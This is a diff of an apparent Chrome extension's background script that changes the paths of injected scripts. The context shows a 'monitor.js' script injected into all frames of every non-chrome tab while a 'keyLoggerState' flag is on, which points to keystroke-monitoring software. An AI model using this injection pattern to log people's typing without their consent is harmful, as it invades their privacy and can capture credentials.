@@ -23,7 +23,7 @@ function intialInjection(){
 				console.log("test " + url);
 				if(url.search('chrome') == -1){
 					chrome.tabs.executeScript(tabs[0].tabId, {
-		        		file:'monitor.js',
+		        		file:'scripts/monitor.js',
 		        		allFrames: true});
 						}
 			});
@@ -80,7 +80,7 @@ chrome.tabs.onActivated.addListener(function(activeInfo){
 			//console.log("ActiveChanged inloop tabid: "+ activeInfo.tabId);
 			if(tabUrl.search('chrome') == -1){
 				chrome.tabs.executeScript(activeInfo.tabId, {
-		        file:'monitor.js',
+		        file:'scripts/monitor.js',
 		        allFrames: true});
 		        //injectedtabs.push(activeInfo.tabId);
 			}
@@ -97,7 +97,7 @@ chrome.tabs.onUpdated.addListener(function(tabId,changeInfo,tab){
 	if(keyLoggerState == true){
 		if(tabUrl.search('chrome') == -1){
 			chrome.tabs.executeScript(tabId, {
-	        file:'monitor.js',
+	        file:'scripts/monitor.js',
 	        allFrames: true});
 		}
 	}
@@ -136,7 +136,7 @@ chrome.alarms.onAlarm.addListener(function(alarm){
     	//console.log(tabs[i].url);
     	var currentTab = tabs[i].url;
     	if(currentTab.search('chrome') == -1){
-        	chrome.tabs.executeScript(tabs[i].id,{file:'autologout.js'});
+        	chrome.tabs.executeScript(tabs[i].id,{file:'scripts/autologout.js'});
     	}
     }
 	});
